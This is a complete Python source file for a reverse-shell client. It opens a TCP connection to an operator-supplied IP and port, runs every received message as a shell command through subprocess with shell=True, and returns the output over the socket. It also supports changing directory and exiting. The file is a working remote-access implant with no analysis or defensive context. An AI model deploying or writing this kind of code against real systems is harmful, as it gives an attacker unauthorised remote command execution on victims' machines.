import socket
import subprocess
import os
import sys

def session_handler():
    print(f'[+] Connecting to {host_ip}.')
    sock.connect((host_ip, host_port))
    print(f'[+] Connected to {host_ip}.')

    while True:
        try:
            print('[+] Listening for response...')
            # receive, decode, print message
            message = sock.recv(1024).decode()

            # Exit on sending 'exit'
            if message == 'exit':
                print ('[-] Server terminated session.')
                sock.close()
                break
            # Change directory script  
            elif message.split(" ")[0] == 'cd':  
                directory = str(message.split(" ")[1])  
                os.chdir(directory)  
                cur_dir = os.getcwd()  
                print(f'[+] Changed to {cur_dir}')  
                sock.send(cur_dir.encode())
            else:
                #Subprocess command handling 
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
                output = command.stdout.read() + command.stderr.read() 
                sock.send(output)

        # Custom error/exit messages
        except KeyboardInterrupt:
            print("[~] Keyboard interrupt received.")
            sock.close()
            break

        except Exception:
            print("[~] Generic error message.")
            sock.close()
            break

# instantiate websocket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host_ip = sys.argv[1]  
host_port = int(sys.argv[2])

session_handler()